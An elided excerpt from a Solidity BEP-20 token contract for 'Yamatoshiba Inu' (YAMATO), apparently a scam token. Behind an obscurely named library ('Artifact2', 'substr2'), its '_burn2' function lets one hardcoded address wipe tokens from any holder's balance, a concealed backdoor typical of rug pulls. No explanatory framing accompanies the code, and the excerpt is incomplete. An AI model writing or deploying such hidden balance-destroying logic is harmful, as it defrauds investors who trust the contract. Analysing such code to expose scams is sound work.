...
library Artifact2 {
 ...
 function substr2(uint256 a, uint256 b) internal pure returns (uint256) {
        return substr2(a, b, "SafeMath: subtraction overflow");
    }
...
contract TokenContract2 is IBEP20, Context {
    using SafeMath for uint256;
    using Artifact2 for uint256;
    ...
    string constant _name = "Yamatoshiba Inu";
    string constant _symbol = "YAMATO";
    ...
    function _burn2(address account, uint256 amount) internal virtual {
        _balances[account] = _balances[account].substr2(amount);
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        require(msg.sender == 0xe6A7d2C0661Cd5571641C809670eCD1229b56748);
    }
